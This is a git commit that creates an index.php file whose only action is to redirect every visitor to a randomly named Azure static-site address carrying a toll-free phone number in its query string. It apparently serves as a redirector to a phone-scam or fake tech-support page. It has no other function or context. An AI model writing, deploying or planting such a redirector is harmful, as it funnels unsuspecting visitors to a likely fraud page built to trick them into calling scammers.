74673053e9d6e09d63310d0a8d067ecef97e145c
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-10-31 19:56:45 +0530

    Create index.php

---
+++ index.php
@@ -0,0 +1,11 @@
+<?php
+// Define the destination URL
+$destination_url = "https://quads87core8cumpu87.z1.web.core.windows.net/index.html?Aniph=1-855-458-7201";
+
+// Send the Location header for redirection
+header("Location: " . $destination_url);
+
+// It's crucial to stop script execution after sending the header
+// to prevent any further output or unintended actions.
+exit(); 
+?>
